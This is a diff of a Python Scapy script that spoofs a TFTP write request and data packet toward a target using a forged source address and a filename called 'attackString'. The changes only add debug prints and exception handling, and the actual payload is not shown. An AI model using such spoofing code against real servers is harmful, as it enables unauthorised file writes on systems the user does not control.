@@ -43,13 +43,22 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     basic_udp = basic_ip/scapy.UDP(sport=sport,dport=TFTPPort)
     WRQ = basic_udp/scapy.TFTP(op=2)/scapy.TFTP_RRQ(filename=attackString,mode="octet")
 
+    print ("sudScapy: spoofTFTP 1")
+
     print ("WRQ Packet is")
     WRQ.show()
 
+    print ("sudScapy: spoofTFTP 2")
+
     print ("Sending...")
-    r = None
-    while not r or scapy.UDP not in r:
-        r = scapy.sr1(WRQ, timeout=3, verbose=False)
+    try:
+        r = None
+        while not r or scapy.UDP not in r:
+            r = scapy.sr1(WRQ, timeout=3, verbose=True)
+    except Exception as exc:
+        print (f"Failed to send WRQ with exception {exc}")
+
+    print ("sudScapy: spoofTFTP 3")
 
     print ("Response is")
     r.show()
@@ -65,17 +74,26 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     print ("DATA packet is")
     DATA.show()
 
+    print ("sudScapy: spoofTFTP 4")
+
     r2 = None
-    while not r2 or scapy.UDP not in r2:
-        r2 = scapy.sr1(DATA, timeout=3, verbose=False)
+    try:
+        while not r2 or scapy.UDP not in r2:
+            r2 = scapy.sr1(DATA, timeout=3, verbose=True)
+    except Exception as exc:
+        print (f"Failed to send DATA with exception {exc}")
+
     print ("Response2 is")
     r2.show()
+
+    print ("sudScapy: spoofTFTP 5")
 
     return
 
 if __name__ == '__main__':
     import sys
     na = len(sys.argv)
+    print (f"Number of args is {na}")
     if (na != 5):
         print ("\n<INVAID> Wrong number of arguments passed to sudoScapy.py\n")
         exit (0)
@@ -89,5 +107,5 @@ if __name__ == '__main__':
     try:
         spoofTFTP (sys.argv[2], sys.argv[3], int(sys.argv[4]))
     except Exception as exc:
-        errorAndLog ("Failed to spoof TFTP", exc=exc, doPrint=False)
+        print (f"Failed to spoof TFTP - unhandled exception {exc}")
     exit (0)
